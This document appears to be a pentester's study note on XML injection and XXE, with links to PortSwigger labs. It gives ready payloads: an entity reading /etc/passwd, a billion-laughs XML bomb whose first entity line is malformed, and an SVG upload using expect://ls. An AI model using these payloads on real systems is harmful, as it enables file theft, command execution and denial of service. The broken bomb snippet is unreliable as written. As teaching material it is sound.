# Overview
>**XML Injection** is a type of attack that targets web applications that generate XML content. Attackers use malicious code to exploit vulnerabilities in XML parsers to manipulate the content of an XML document. This can result in unauthorized access to sensitive data, denial of service, and other potential risks to the application and its users
## Types
1. **Entity Injection**: An attacker can inject XML entities to modify or expose sensitive data, resulting in security vulnerabilities like information disclosure, denial of service, and remote code execution.
2. **Attribute Injection**: An attacker can inject malicious code into XML attributes, which can be executed when the attribute is processed.
3. **Schema Poisoning**: An attacker can modify the schema of an XML document to manipulate the parser's behavior or cause it to crash.
4. **XSLT Injection**: An attacker can inject malicious code into the XSLT stylesheet used to transform an XML document. This can be used to execute arbitrary code or manipulate the output of the transformation.

## XXE - XML External Entities
### Overview

>[!INFO] What is a XML External Entity Injection ?
XML external entity injection (also known as XXE) is a web security vulnerability that allows an attacker to interfere with an application's processing of XML data. It often allows an attacker to view files on the application server filesystem, and to interact with any back-end or external systems that the application itself can access.
Some applications use the XML format to transmit data between the browser and the server. Applications that do this virtually always use a standard library or platform API to process the XML data on the server. XXE vulnerabilities arise because the XML specification contains various potentially dangerous features, and standard parsers support these features even if they are not normally used by the application. 
XML external entities are a type of custom XML entity whose defined values are **loaded from outside of the DTD** in which they are declared. External entities are particularly interesting from a security perspective because they allow an entity to be defined based on the contents of a file path or URL.

### Types
- [Exploiting XXE to retrieve files](https://portswigger.net/web-security/xxe#exploiting-xxe-to-retrieve-files), where an external entity is defined containing the contents of a file, and returned in the application's response.
- [Exploiting XXE to perform SSRF attacks](https://portswigger.net/web-security/xxe#exploiting-xxe-to-perform-ssrf-attacks), where an external entity is defined based on a URL to a back-end system.
- [Exploiting blind XXE exfiltrate data out-of-band](https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-exfiltrate-data-out-of-band), where sensitive data is transmitted from the application server to a system that the attacker controls.
- [Exploiting blind XXE to retrieve data via error messages](https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-retrieve-data-via-error-messages), where the attacker can trigger a parsing error message containing sensitive data.

### Exploit
#### XXE to SSRF
[XXE Payloads](https://github.com/payloadbox/xxe-injection-payload-list)

#### XXE to LFI

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE reset [
<!ENTITY ignite SYSTEM "file:///etc/passwd">
]>...<CODE>
```

#### XXE Billion Laugh Attack-DOS

>[!INFO]
>These are aimed at XML parsers in which both, well-formed and valid, XML data crashes the system resources when being parsed. This attack is also known as **XML bomb** or XML **DoS** or exponential entity expansion attack.

```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE lolz [<!ENTITY lol "lol"><!ELEMENT lolz (#PCDATA)>
<!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;
<!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
<!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
<!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
<!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
<!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
<tag>&lol9;</tag>
```

#### XXE File Upload

For instance with a SVG file : 
```html
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
    <image xlink:href="expect://ls" width="200" height="200"></image>
</svg>
```

Reference : https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload